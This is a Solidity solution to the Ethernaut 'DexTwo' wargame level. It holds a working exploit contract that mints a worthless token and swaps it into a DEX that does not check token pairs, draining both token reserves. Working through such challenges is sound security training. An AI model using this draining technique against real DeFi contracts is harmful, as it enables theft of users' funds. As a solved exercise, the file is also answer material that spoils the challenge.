// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

/**
 * @title 23. DEX
 * @dev Drain all 2 tokens from the contract.
 */

interface IDex {
    function token1() external returns (address);

    function token2() external returns (address);

    function swap(address from, address to, uint256 amount) external;

    function approve(address spender, uint256 amount) external;

    function balanceOf(
        address token,
        address account
    ) external view returns (uint256);
}

contract FreeToken is ERC20 {
    constructor(address _ethernaut_DexTwo) ERC20("FreeToken", "FTK") {
        // Pass the address of your contract to receive the tokens directly
        _mint(_ethernaut_DexTwo, 10000000 * 10 ** decimals());
    }
}

contract Ethernaut_DexTwo {
    IDex private idex = IDex(0x56aA45E6eAA6178623B662e49eeb77c44d64e900); // Replace with you DexTwo instance
    address private freeToken;
    address private token1 = idex.token1();
    address private token2 = idex.token2();

    // 1. Set address of our freeToken
    function setFreeToken(address _freeToken) public {
        freeToken = _freeToken;
    }

    function attack() public {
        idex.approve(address(idex), type(uint256).max);
        IERC20(freeToken).approve(address(idex), type(uint256).max);

        // 2. Send 100 freeToken, then empty the reserves of token1
        IERC20(freeToken).transfer(address(idex), 100);
        idex.swap(freeToken, token1, 100);

        // 3. Next, empty the reserves of token2
        // The contract has now 200 freeTokens and 100 token2
        // x in | 200 - 100 | 100 out (x*100/200)=100 so: x=100/0.5 so: x=200
        idex.swap(freeToken, token2, 200);

        require(
            IERC20(token1).balanceOf(address(idex)) == 0 &&
                IERC20(token2).balanceOf(address(idex)) == 0,
            "Hack failed!"
        );
    }
}

// 🎉 Level completed! 🎉
